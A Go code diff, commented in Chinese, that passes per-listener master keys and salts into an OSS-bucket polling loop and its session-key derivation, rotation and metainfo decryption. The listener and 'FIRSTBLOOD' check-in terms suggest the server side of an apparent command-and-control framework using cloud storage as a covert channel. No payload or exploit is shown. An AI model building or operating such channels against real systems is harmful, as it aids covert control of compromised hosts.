@@ -67,7 +67,9 @@ func UnregisterListener(stopKey string) {
 // HandleOSSConnection 轮询指定 OSS 桶。client 由调用方（handleOpenPort）初始化后传入：
 // 每个监听器一份，不再共用全局状态。stopKey 即该监听器的 listen_address，
 // 用于读取停止通道与登记客户端归属（原实现由四段地址拼回，属脆弱重建）。
-func HandleOSSConnection(client *Client, stopKey string) {
+// masterKey/salt 为该监听器的会话密钥材料（已归一化为 32/16 字节）：
+// 多实例下不能按类型查库（只能取到任意一行）。
+func HandleOSSConnection(client *Client, stopKey string, masterKey, salt []byte) {
 	// 崩溃防护：OSS 处理循环任何 panic 都不能杀死整个进程
 	defer func() {
 		if r := recover(); r != nil {
@@ -107,7 +109,7 @@ func HandleOSSConnection(client *Client, stopKey string) {
 
 		// 3. 顺序处理
 		for _, key := range keys {
-			process_server(client, stopKey, key) // 不用 `go`，保证按顺序执行
+			process_server(client, stopKey, key, masterKey, salt) // 不用 `go`，保证按顺序执行
 		}
 
 		// 空闲退避: 无消息时间隔翻倍直至上限;有消息立即回到 1s
@@ -121,7 +123,7 @@ func HandleOSSConnection(client *Client, stopKey string) {
 		}
 	}
 }
-func process_server(c *Client, stopKey, name string) {
+func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {
 
 	message := Get(c, name)
 	Del(c, name)
@@ -145,7 +147,7 @@ func process_server(c *Client, stopKey, name string) {
 			logx.Println(err)
 			return
 		}
-		metaMK, metaSalt := encrypt.GetListenerKeyConfig("oss")
+		metaMK, metaSalt := masterKey, salt
 		// J4: 拒绝公开默认密钥连接
 		if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
 			logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接\n")
@@ -167,9 +169,7 @@ func process_server(c *Client, stopKey, name string) {
 
 		// 立即为客户端生成会话密钥（确保与客户端同步）
 		if encrypt.GlobalKeyManager != nil {
-			// 获取监听器特定的密钥配置
-			_, encryptionSalt := encrypt.GetListenerKeyConfig("oss")
-			_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListener(uid, encryptionSalt, "oss")
+			_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, salt, masterKey, salt)
 			if err != nil {
 				logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 为客户端 %s 生成会话密钥失败: %v\n", uid, err)
 			} else {
@@ -251,8 +251,7 @@ func process_server(c *Client, stopKey, name string) {
 		if encrypt.GlobalKeyManager != nil {
 			nonce := make([]byte, 16)
 			if _, err := rand.Read(nonce); err == nil {
-				vkey, encSalt := encrypt.GetListenerKeyConfig("oss")
-				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, encSalt, []byte(vkey), encSalt, nonce)
+				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, salt, masterKey, salt, nonce)
 				if err != nil {
 					logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化失败: %v\n", uid, err)
 				} else if b64Payload := command.BuildSessionNonceMsgWithKey(initialKey, nonce); b64Payload != nil {
@@ -293,7 +292,7 @@ func process_server(c *Client, stopKey, name string) {
 		if err != nil {
 			logx.Println(err)
 		}
-		metaMK, _ := encrypt.GetListenerKeyConfig("oss")
+		metaMK := masterKey
 		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMK)
 		if err != nil {
 			logx.Println(err)
